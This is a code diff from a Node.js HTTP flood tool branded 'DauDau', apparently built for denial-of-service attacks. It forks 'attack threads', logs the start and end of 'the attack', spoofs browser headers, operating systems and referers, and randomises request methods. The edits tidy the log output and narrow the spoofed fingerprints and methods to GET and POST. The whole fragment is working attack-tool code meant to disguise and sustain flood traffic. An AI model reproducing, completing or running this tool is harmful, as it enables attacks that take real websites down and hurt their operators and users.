@@ -46,16 +46,16 @@
   Promise.race([axiosPromise, timeoutPromise])
     .then((response) => {
       const { status, data } = response;
-      console.log(`[\x1b[35mDauDau\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
+      console.log(`${getCurrentTime()} ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
     })
     .catch((error) => {
       if (error.message === 'Request timed out') {
-        console.log(`[\x1b[35mDauDau\x1b[0m] ${getCurrentTime()} Request Timed Out`);
+        console.log(`${getCurrentTime()} Request Timed Out`);
       } else if (error.response) {
         const extractedTitle = getTitleFromHTML(error.response.data);
-        console.log(`[\x1b[35mDauDau\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
+        console.log(`${getCurrentTime()} ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
       } else {
-        console.log(`[\x1b[35mDauDau\x1b[0m] ${getCurrentTime()} ${error.message}`);
+        console.log(`[\x1b[35mDauDau\x1b[0m] ${error.message}`);
       }
     });
 }
@@ -105,12 +105,12 @@
 
 if (cluster.isMaster){
   console.clear();
-  console.log(`\x1b[96mDauDau\x1b[0m`);
+  console.log(`[${getCurrentTime()} - \x1b[35mDauDau\x1b[0m]`);
   for (let i = 1; i <= process.argv[5]; i++){
     cluster.fork();
-    console.log(`[\x1b[35mDauDau\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
+    console.log(`${getCurrentTime()} Attack Thread ${i} Started`);
   }
-  console.log(`[\x1b[35mDauDau\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
+  console.log(`${getCurrentTime()} The Attack Has Started`);
   setInterval(getStatus, 2000);
   setTimeout(() => {
     console.log(`[\x1b[35mDauDau\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
@@ -132,7 +132,7 @@ let headerGenerator = new HeaderGenerator({
     ],
     operatingSystems: [
         "windows",
-        "linux",
+        // "linux",
         "macos",
         "android",
         "ios",
@@ -361,14 +361,14 @@ controle_header = [
 
 const Methods = [
   "GET",
-  "HEAD",
   "POST",
-  "PUT",
-  "DELETE",
-  "CONNECT",
-  "OPTIONS",
-  "TRACE",
-  "PATCH",
+  // "HEAD",
+  // "PUT",
+  // "DELETE",
+  // "CONNECT",
+  // "OPTIONS",
+  // "TRACE",
+  // "PATCH",
 ];
 const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
 
@@ -909,5 +909,3 @@ headers["Referer"] = randomReferer;
          });
      });
  }
-
-
